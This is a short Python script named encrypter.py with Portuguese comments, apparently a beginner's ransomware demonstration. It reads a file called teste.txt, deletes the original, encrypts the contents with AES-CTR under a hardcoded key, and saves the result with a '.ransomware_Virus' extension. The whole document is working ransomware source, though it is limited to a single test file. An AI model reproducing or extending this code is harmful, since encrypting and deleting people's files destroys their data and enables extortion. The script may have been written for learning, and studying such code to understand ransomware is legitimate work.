  GNU nano 6.3                                                                                                    encrypter.py                                                                                                              
import os
import pyaes

## abrir o arquivo a ser criptografado
file_name ="teste.txt"
file  = open(file_name, "rb")
file_data = file.read()
file.close()

## remove o arquivo

os.remove(file_name)

## nessa etapa sera adcionado a chave de criptografia

key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)


##  arquivo criptografado

crypto_data = aes.encrypt(file_data)

## salva arquivo criptografado

new_file = file_name + ".ransomware_Virus"
new_file = open(f'{new_file}', "wb")
new_file.write(crypto_data)
new_file.close()



